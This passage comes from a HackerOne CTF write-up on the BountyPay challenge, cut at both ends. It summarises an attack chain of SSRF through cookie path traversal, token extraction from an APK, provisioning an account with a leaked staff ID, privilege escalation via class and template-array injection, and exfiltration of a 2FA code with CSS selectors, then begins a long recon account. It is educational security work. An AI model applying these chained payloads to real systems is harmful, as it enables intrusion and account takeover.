\u003ccode\u003eF8gHiqSdpK\u003c/code\u003e, within the request path- which is in fact taken from \u003ccode\u003eaccount_id\u003c/code\u003e of the session cookie and interpolated into request path without any sanitization. By changing \u003ccode\u003eaccount_id\u003c/code\u003e within our authentication cookie we can thus achieve SSRF via Path Traversal - but for now only on same host.\u003c/li\u003e\n\u003cli\u003eFront page on \u003ccode\u003eapi.bountypay.h1ctf.com\u003c/code\u003e reveals an endpoint that allows a redirect: \u003ccode\u003ehttps://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API\u003c/code\u003e. It uses a whitelist and does not appear to allow an Open Redirect, but several BountyPay subdomains are whitelisted, including \u003ccode\u003esoftware.bountypay.h1ctf.com\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e Content discovery on \u003ccode\u003esoftware.bountypay.h1ctf.com\u003c/code\u003e via SSRF with the aforementioned redirect (which bypasses IP restriction) reveals \u003ccode\u003e/uploads\u003c/code\u003e folder with Directory Listing enabled. The only file within it, \u003ca href=\"/redirect?url=http%3A%2F%2Fsoftware.bountypay.h1ctf.com%2Fuploads%2FBountyPay.apk\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e\u003ccode\u003eBountyPay.apk\u003c/code\u003e\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, can be downloaded directly from a public IP.\u003c/li\u003e\n\u003cli\u003eAPK interacts with a Firebase instance and presents a series of screens that eventually lead to obtaining a header name (\u003ccode\u003eX-Token\u003c/code\u003e), a header value (\u003ccode\u003e8e9998ee3137ca9ade8f372739f062c1\u003c/code\u003e) and a host name (\u003ccode\u003eapi.bountypay.h1ctf.com\u003c/code\u003e). One way those could be obtained is by decompiling the code and following the designed challenges, which involve sending \u003ca href=\"/redirect?url=https%3A%2F%2Fdeveloper.android.com%2Ftraining%2Fapp-links%2Fdeep-linking\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003edeep links\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e to the app. The data of interest could either be intercepted with a proxy, or retrieved  from \u003ccode\u003e/shared_prefs/user_created.xml\u003c/code\u003e with \u003ccode\u003eadb\u003c/code\u003e. Or alternatively one could also have interacted with Firebase directly, using the credentials that are located in \u003ccode\u003eres/values/strings.xml\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\n\u003ccode\u003eX-Token: 8e9998ee3137ca9ade8f372739f062c1\u003c/code\u003e allows us to make API calls directly on \u003ccode\u003eapi.bountypay.h1ctf.com\u003c/code\u003e without SSRF - including \u003ccode\u003ePOST\u003c/code\u003e calls that we could not do before. Content discovery on the \u003ccode\u003e/api\u003c/code\u003e directory reveals \u003ccode\u003e/api/staff\u003c/code\u003e endpoint.\n\n\u003cul\u003e\n\u003cli\u003e\n\u003ccode\u003eGET\u003c/code\u003e request returns some JSON data for a couple of staff members, which includes \u003ccode\u003estaff_id\u003c/code\u003efield with values like \u003ccode\u003eSTF:KE624RQ2T9\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\n\u003ccode\u003ePOST\u003c/code\u003e request returns \u003ccode\u003e[\u0026quot;Missing Parameter\u0026quot;]\u003c/code\u003e message. The parameter it wants is \u003ccode\u003estaff_id\u003c/code\u003e, and for the valid staff ids it gives \u003ccode\u003eHTTP/1.1 409 Conflict\u003c/code\u003e with message \u003ccode\u003e[\u0026quot;Staff Member already has an account\u0026quot;]\u003c/code\u003e. Response code hints at the fact that it could provision the new account if we give it a valid  staff id who\u0026#39;s account has not yet been set up - e.g. a new joiner.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FBountypayHQ\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eBountypayHQ\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e Twitter account has a tweet \u003ccode\u003eToday we welcome Sandra to the team!!!\u003c/code\u003e, which is the new joiner we\u0026#39;re looking for. We can find \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FSandraA76708114\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eSandra\u0026#39;s\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e twitter account among either \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FBountypayHQ%2Ffollowing\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003efollowing\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e or \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FBountypayHQ%2Ffollowers\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003efollowers\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e lists for BountypayHQ, and in her timeline we see \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FSandraA76708114%2Fstatus%2F1258693001964068864\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ethis tweet\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e with a photo featuring her staff access card that shows her Staff ID: \u003ccode\u003eSTF:8FJ3KFISL3\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eUsing this \u003ccode\u003estaff_id\u003c/code\u003e in a \u003ccode\u003ePOST\u003c/code\u003e request to \u003ccode\u003e/api/staff\u003c/code\u003e provisions a new account, giving us \u003ccode\u003eusername\u003c/code\u003e and \u003ccode\u003epassword\u003c/code\u003e to access Staff portal at \u003ccode\u003estaff.bountypay.h1ctf.com\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e After logging in with Sandra\u0026#39;s credentials and inspecting available endpoints and JS source code, it becomes apparent that the goal of the next challenge is to upgrade her account to Admin. We can see the endpoint for this in JS code, \u003ccode\u003e/admin/upgrade?username=\u003c/code\u003e, but it can only be done by an admin user. We can \u0026quot;report\u0026quot; any page, which makes admin user visit it, but there is an exception that pages under \u003ccode\u003e/admin\u003c/code\u003e would not be visited. There are two separate vulnerabilities that need to be chained to achieve the desired result.\n\n\u003cul\u003e\n\u003cli\u003eFirstly, the trick is to notice that JS code uses very loose selectors (that are based on class only) to perform several actions: \u003ccode\u003e$(\u0026quot;.upgradeToAdmin\u0026quot;).click\u003c/code\u003e would issue the request to upgrade the account, and \u003ccode\u003e\u0026quot;#tab4\u0026quot; === document.location.hash \u0026amp;\u0026amp; $(\u0026quot;.tab4\u0026quot;).trigger(\u0026quot;click\u0026quot;)\u003c/code\u003e allows us to force Admin to do the click on an element with \u003ccode\u003e.tab4\u003c/code\u003e class. Coincidentally, there is a feature to change avatar - which is a string used as a class name. Setting it to \u003ccode\u003eupgradeToAdmin tab4\u003c/code\u003e and reporting that page (\u003ccode\u003e/?template=ticket\u0026amp;ticket_id=3582#tab4\u003c/code\u003e) allows us to force Admin to make the API call.\u003c/li\u003e\n\u003cli\u003eWhat remains is to make sure the above call is made with the correct username, which is taken from an input with name \u003ccode\u003eusername\u003c/code\u003e: \u003ccode\u003elet t = $(\u0026#39;input[name=\u0026quot;username\u0026quot;]\u0026#39;).val();\u003c/code\u003e. There is no such input on the page we\u0026#39;re reporting (where we can control the class via avatar), \u003ccode\u003e/?template=ticket\u0026amp;ticket_id=3582#tab4\u003c/code\u003e, but there is one in the login page, \u003ccode\u003e/?template=login?username=sandra.allison\u003c/code\u003e. Since backend is PHP we can force \u003ccode\u003etemplate\u003c/code\u003e parameter to be an array with both \u003ccode\u003eticket\u003c/code\u003e and \u003ccode\u003elogin\u003c/code\u003e values - and luckily for us, a rather weird backend implementation renders both templates and appends them one after another in the response. We can thus piece it all together in a request such as \u003ccode\u003e/?template[]=login\u0026amp;username=sandra.allison\u0026amp;template[]=ticket\u0026amp;ticket_id=3582#tab4\u003c/code\u003e that we \u0026quot;report\u0026quot; to Admin and this concludes the Privilege Escalation step. In response we\u0026#39;re given a new session cookie - when logged in with that cookie we can see a new tab with customer account usernames and clear-text passwords, including Mårten\u0026#39;s credentials.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eBack to Customer portal, \u003ccode\u003eapp.bountypay.h1ctf.com\u003c/code\u003e, we login with new credentials and use same \u003ccode\u003echallenge\u003c/code\u003e/\u003ccode\u003echallenge_answer\u003c/code\u003epair as before to bypass login 2FA. We now have access to the transactions that need to be processed, but there is one last challenge - it is protected by another 2FA. The task is to exfiltrate challenge answer (code) from a page rendered in the backend within Headless Chrome, and the only thing we know about that page, is that is takes a stylesheet from a URL that\u0026#39;s under our control and likely embeds it in that page. It can indeed be verified that our stylesheet is embedded within a \u003ccode\u003e\u0026lt;link rel=\u0026quot;stylesheet\u0026quot;\u0026gt;\u003c/code\u003e tag with e.g. Burp Collaborator. Under this setup it\u0026#39;s not actually possible to exfiltrate data using \u003ca href=\"/redirect?url=https%3A%2F%2Fmedium.com%2F%40d0nut%2Fbetter-exfiltration-via-html-injection-31c72a2dae8b\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003erecursive techniques\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e such as asynchronous \u003ccode\u003e@import\u003c/code\u003e loading - because imports within \u003ccode\u003e\u0026lt;link\u0026gt;\u003c/code\u003e (unlike \u003ccode\u003e\u0026lt;style\u0026gt;\u003c/code\u003e) are synchronous, and we only have a single injection point. Thankfully for us, the recursive import is not needed since we discover there are multiple inputs on the page - one for each code character. So the entire code can be exfiltrated directly using a bunch of selectors. With the exfiltrated code we complete 2FA verification and are finally presented with the Flag. That is the end of the CTF.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003chr\u003e\n\n\u003ch1 id=\"long-writeup\"\u003eLong Writeup\u003c/h1\u003e\n\n\u003cp\u003eFor those more patient, as promised in the beginning, here is a long writeup where I attempt to describe my process of thinking, including all failed attempts and dead ends.\u003c/p\u003e\n\n\u003cp\u003eAs usual, the challenge starts with a \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FHacker0x01%2Fstatus%2F1266454022124376064\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003etweet\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e:\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"ctf-tweet.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/iq2fYq3LVJaMrmfXuNzYD9cW?response-content-disposition=attachment%3B%20filename%3D%22ctf-tweet.png%22%3B%20filename%2A%3DUTF-8%27%27ctf-tweet.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=3ef920d1c008da589c85bfb7d6b4b5b342e9b01937a9f15fc5cf4a16cb54b2c3\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/iq2fYq3LVJaMrmfXuNzYD9cW?response-content-disposition=attachment%3B%20filename%3D%22ctf-tweet.png%22%3B%20filename%2A%3DUTF-8%27%27ctf-tweet.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=3ef920d1c008da589c85bfb7d6b4b5b342e9b01937a9f15fc5cf4a16cb54b2c3\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"reconnaissance\"\u003eReconnaissance\u003c/h2\u003e\n\n\u003cp\u003eLooking at the \u003ccode\u003eScope\u003c/code\u003e section of the CTF \u003ca href=\"https://hackerone.com/h1-ctf?view_policy=true\"\u003ePolicy\u003c/a\u003e page, we notice that the domain scope is a wildcard \u003ccode\u003e*.bountypay.h1ctf.com\u003c/code\u003e. An obvious first thing to do is thus to kick off a subdomain enumeration (and frankly one should do this anyway).\u003c/p\u003e\n\n\u003cp\u003eMy go-to tool for subdomain enumeration from passive data sources is \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FOWASP%2FAmass\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eAmass\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Although you should ideally set it up with all API keys to various data sources, a simple passive enumeration can be done with just:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003eamass enum \u003cspan class=\"nt\"\u003e--passive\u003c/span\u003e \u003cspan class=\"nt\"\u003e-d\u003c/span\u003e bountypay.h1ctf.com\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp\u003eI recommend Amass only for passive enumeration. For bruteforcing you\u0026#39;d be better off using \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fblechschmidt%2Fmassdns\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eMassdns\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e with a carefully curated list of resolvers. For the reasons why, I highly recommend the excellent post \u003ca href=\"/redirect?url=https%3A%2F%2F0xpatrik.com%2Fsubdomain-enumeration-2019%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eSubdomain Enumeration: 2019 Workflow\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e by \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2F0xpatrik\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ePatrik Hudak\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e - in fact his entire blog is worth a careful read. \u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eThis enumeration yielded several subdomains:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eapp.bountypay.h1ctf.com\nstaff.bountypay.h1ctf.com\napi.bountypay.h1ctf.com\nwww.bountypay.h1ctf.com\nsoftware.bountypay.h1ctf.com\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFollowing my normal bug hunting routine I then tried to brute-force for more subdomains using \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fblechschmidt%2Fmassdns\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eMassdns\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e  with \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fassetnote%2Fcommonspeak2-wordlists%2Fblob%2Fmaster%2Fsubdomains%2Fsubdomains.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ecommonspeak2\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e wordlist, as well as using alterations on existing names with \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FProjectAnte%2Fdnsgen\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ednsgen\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, but this did not yield any new results.\u003c/p\u003e\n\n\u003cp\u003eNext, I kicked off content discovery on each subdomain. In this instance I\u0026#39;ve simply used Burp (\u003ccode\u003eEngagement tools\u003c/code\u003e-\u0026gt;\u003ccode\u003eDiscover content\u003c/code\u003e), though I can also highly recommend using \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fffuf%2Fffuf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003effuf\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e for this with a good wordlist.\u003c/p\u003e\n\n\u003cp\u003eWhile this was running, I manually reviewed each subdomain - HTML and JS code. First observations:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003ccode\u003eapp\u003c/code\u003e and \u003ccode\u003estaff\u003c/code\u003e subdomains require username/password authentication. I\u0026#39;ve tried a few naive things (like empty password, admin:admin etc) but nothing worked.\u003c/li\u003e\n\u003cli\u003e\n\u003ccode\u003esoftware\u003c/code\u003e subdomain appears to restrict access from public IPs: \u003ccode\u003eYou do not have permission to access this server from your IP Address\u003c/code\u003e. Simple things like adding \u003ccode\u003eX-Forwarded-For\u003c/code\u003e or \u003ccode\u003eX-Client-IP\u003c/code\u003epointing to localhost or other private addresses did not change anything. It is likely that we\u0026#39;re going to need to find SSRF to interact with it.\u003c/li\u003e\n\u003cli\u003e\n\u003ccode\u003eapi\u003c/code\u003e subdomain has an interesting redirect in its home page: \u003ccode\u003ehttps://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API\u003c/code\u003e. Changing target host to something else, like \u003ccode\u003eexample.com\u003c/code\u003e, returns \u003ccode\u003eURL NOT FOUND IN WHITELIST\u003c/code\u003e. My first thought was that the whitelist check could be flawed and it could be vulnerable to an Open Redirect (which might prove useful later, such as e.g. for SSRF) but no trick I could think of worked and it seemed pretty secure (I even tried CRLF injection, also no luck). So if it\u0026#39;s a whitelist - then what else could be whitelisted? The obvious thing to try were the other subdomains - and it turns out \u003ccode\u003esoftware\u003c/code\u003e and \u003ccode\u003estaff\u003c/code\u003e are indeed whitelisted. For now let\u0026#39;s just take a note of it, as it might be useful for SSRF - especially to access \u003ccode\u003esoftware\u003c/code\u003e subdomain which is otherwise restricted by IP.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eChecking the content discovery results, I\u0026#39;ve found the first lead - exposed \u003ccode\u003e/.git/\u003c/code\u003e folder on the \u003ccode\u003eapp\u003c/code\u003e subdomain, referencing a GitHub repository:\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eNote: In all HTTP requests/responses within this writeup, only the most relevant headers are shown for brevity.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003eGET\u003c/span\u003e \u003cspan class=\"nn\"\u003e/.git/config\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapp.bountypay.h1ctf.com\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e \u003cspan class=\"m\"\u003e200\u003c/span\u003e \u003cspan class=\"ne\"\u003eOK\u003c/span\u003e\n\n[core]\n    repositoryformatversion = 0\n    filemode = true\n    bare = false\n    logallrefupdates = true\n[remote \u0026quot;origin\u0026quot;]\n    url = https://github.com/bounty-pay-code/request-logger.git\n    fetch = +refs/heads/*:refs/remotes/origin/*\n[branch \u0026quot;master\u0026quot;]\n    remote = origin\n    merge = refs/heads/master\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt was slightly weird that nearly all other files that are normally present were not there. but that\u0026#39;s just part of the CTF. Nevertheless I did try to exfiltrate the content of the repo with \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Finternetwache%2FGitTools%2Fblob%2Fmaster%2FDumper%2Fgitdumper.sh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003egitdumper.sh\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e./gitdumper.sh https://app.bountypay.h1ctf.com/.git/ ./output/\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ebut that didn\u0026#39;t yield anything new.\u003c/p\u003e\n\n\u003cp\u003eOk, so all we need from this is the GitHub repo itself.  I\u0026#39;ve checked this repo (including commit history) and the parent organization, but the only valuable piece of information was \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fbounty-pay-code%2Frequest-logger%2Fblob%2Fmaster%2Flogger.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003elogger.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e file:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;IP\u0026#39;\u003c/span\u003e        \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$_SERVER\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;REMOTE_ADDR\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;URI\u0026#39;\u003c/span\u003e       \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$_SERVER\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;REQUEST_URI\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;METHOD\u0026#39;\u003c/span\u003e    \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$_SERVER\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;REQUEST_METHOD\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;PARAMS\u0026#39;\u003c/span\u003e    \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n      \u003cspan class=\"s1\"\u003e\u0026#39;GET\u0026#39;\u003c/span\u003e   \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"s1\"\u003e\u0026#39;POST\u0026#39;\u003c/span\u003e  \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$_POST\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003efile_put_contents\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;bp_web_trace.log\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nb\"\u003edate\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;U\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan 